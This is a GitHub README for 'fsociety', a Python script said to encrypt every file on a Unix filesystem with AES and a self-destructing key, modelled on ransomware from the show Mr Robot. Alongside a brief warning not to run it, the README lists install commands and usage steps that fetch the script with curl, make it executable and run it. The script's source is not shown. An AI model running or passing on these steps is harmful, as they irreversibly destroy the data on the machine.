# fsociety
__WARNING: do not actually execute this. You will not be able to recover the files.__

This is intended to encrypt every bit of data in a unix filesystem using 256-bit AES with 
a self-destructing, randomly generated key.

The fuxsocy.py script is based on Darlene's malware shown in Mr Robot

## S2E1:

![alt text](https://i.imgur.com/6RIogYa.jpg)

### Dependencies:

* Python3
* pycrypto

```shell
sudo apt install python3 python3-pip
```
```shell
pip3 install pycrypto
```

### Usage:

```shell
curl https://raw.githubusercontent.com/joekendal/fsociety/master/fuxsocy.py
```
```shell
sudo chmod +x fuxsocy.py
```
```shell
./fuxsocy.py
```
